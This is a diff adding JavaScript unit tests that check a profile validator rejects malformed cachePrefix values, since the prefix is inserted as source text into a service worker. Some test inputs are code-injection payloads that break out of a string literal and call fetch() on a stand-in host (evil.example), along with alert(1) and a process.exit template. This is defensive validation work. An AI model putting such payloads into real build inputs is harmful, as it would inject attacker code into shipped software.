@@ -402,6 +402,51 @@ describe('malformed profiles (synthetic)', () => {
       /namespacePolicy: unknown key\(s\): extra/);
   });
 
+  // Stage 8C: cachePrefix is substituted into src/pwa/sw.js as JS SOURCE
+  // TEXT (scripts/build.js), not JSON-safe asInlineScript() embedding, so an
+  // unconstrained value is a JS-injection vector into the shipped service
+  // worker. CACHE_PREFIX_RE (lowercase/hyphen, trailing hyphen) rejects
+  // every string-literal-breaking shape before any dist/ mutation.
+  test('cachePrefix rejects quotes, newlines, delimiters, and other malformed shapes', () => {
+    const cases = [
+      { value: 'x"; fetch("https://evil.example"); //', name: 'double-quote breakout' },
+      { value: "x'; fetch('https://evil.example'); //", name: 'single-quote breakout' },
+      { value: 'x\\"; alert(1); //', name: 'backslash-escaped quote' },
+      { value: 'ham-exam-\nself.foo = 1; //', name: 'embedded newline' },
+      { value: 'ham exam ', name: 'space delimiter' },
+      { value: 'ham_exam_', name: 'underscore delimiter' },
+      { value: 'HAM-EXAM-', name: 'uppercase' },
+      { value: 'ham-exam', name: 'missing trailing hyphen' },
+      { value: '-ham-exam-', name: 'leading hyphen' },
+      { value: 'ham--exam-', name: 'double hyphen' },
+      { value: '1ham-exam-', name: 'leading digit' },
+      { value: '${process.exit(1)}', name: 'template-literal-shaped' }
+    ];
+    for (const { value, name } of cases) {
+      const { errors } = ep.validateEditionProfile(makeProfile({
+        namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: value })
+      }));
+      assert.ok(
+        errors.some((e) => /namespacePolicy\.cachePrefix must be lowercase letters\/digits, hyphen-separated, ending in a hyphen/.test(e)),
+        `expected cachePrefix ${JSON.stringify(value)} (${name}) to be rejected, got:\n${errors.join('\n') || '(no errors)'}`
+      );
+    }
+    // Empty string is caught by the pre-existing non-blank-string check,
+    // named distinctly (not the shape message) -- still a rejection either way.
+    expectErrors(makeProfile({
+      namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: '' })
+    }), /namespacePolicy\.cachePrefix must be a non-blank string/);
+  });
+
+  test('cachePrefix accepts single- and multi-segment lowercase/hyphen prefixes ending in a hyphen', () => {
+    for (const value of ['a-', 'ham-exam-', 'synthetic-exam-', 'in-asoc-2026-']) {
+      const { errors } = ep.validateEditionProfile(makeProfile({
+        namespacePolicy: Object.assign({}, makeProfile().namespacePolicy, { cachePrefix: value })
+      }));
+      assert.deepEqual(errors, [], `expected ${JSON.stringify(value)} to validate clean, got:\n${errors.join('\n')}`);
+    }
+  });
+
   // Stage 7C: build inputs -- schema, per-pool mapping completeness/identity,
   // and pure path safety (relative, no traversal, no absolute, no backslash).
   test('malformed build inputs are rejected: shape, unknown keys, and missing required fields', () => {
@@ -868,5 +913,18 @@ describe('runtime projection namespacePolicy (Stage 8A2)', () => {
       delete config[field];
       expectRuntimeErrors(config, new RegExp(`missing required field "${field}"`));
     }
+  });
+
+  // Stage 8C: validateNamespacePolicy() is the SAME function both
+  // validateEditionProfile() and validateEditionRuntimeConfig() call, so the
+  // cachePrefix shape gate applies identically to the derived projection --
+  // a derivation bug that mangled cachePrefix would be caught here too.
+  test('a malformed cachePrefix in the derived projection is rejected the same way as in the profile', () => {
+    const config = makeRuntimeConfig({
+      namespacePolicy: Object.assign({}, makeRuntimeConfig().namespacePolicy, {
+        cachePrefix: 'x"; fetch("https://evil.example"); //'
+      })
+    });
+    expectRuntimeErrors(config, /namespacePolicy\.cachePrefix must be lowercase letters\/digits, hyphen-separated, ending in a hyphen/);
   });
 });
